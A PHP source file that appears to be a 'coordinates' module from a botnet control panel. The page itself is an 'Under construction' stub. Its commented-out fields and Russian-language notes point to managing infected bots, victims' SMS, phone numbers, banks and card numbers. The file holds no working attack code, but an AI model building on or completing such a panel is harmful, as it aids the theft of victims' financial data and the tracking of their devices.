<?php
require_once "cmd_mod.php";

class coordinates extends modBase
{
	protected $module_name = 'coordinates';

	function get_filter()
	{
		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			//~ array('bot_id', 'Bot ID'),
			//~ array('bot_comment', 'Bot comment', 'Part of any your comments'),
			//~ array('number', 'Phone number', '35542223570', modBase::$filters['phone']),
			//~ array('text', 'Text', 'Part of text in SMS'),
		);
		
		// bot id, bot comment, country list, CC number/bin, only online bots
		return $this->build_filter($fields);
	}
	
	function get_content()
	{
		$content = "<div class='row'>
			<div class='col-md-12' style='font-size: 32pt; text-align: center'>
				<i class='fa fa-compass marginRight10'></i>Coordinates
				</div>
		</div>
		<div>&nbsp;</div>
		<div><center><h4>Under construction</h4></center></div>";
		return $this->wrap_content("", $content);
		
		// показывать статус бота кружок
		// кнопки ПОказать смс бота, его банки, страницу деталей бота - все в новом окне
		$content = 'coords TODO'; //$this->get_table($rows, $headers, 'textcenter');
		$total_rows = 500;
		
		$paging = $this->get_limit($total_rows, $this->results_on_page);
		
		// TODO export to csv, txt
		$buttons = array(
			array('Delete selected', 'Delete all selected items', 'show_ajax_form("panel_delete_sms")', 'danger'),
		);
		
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}
}
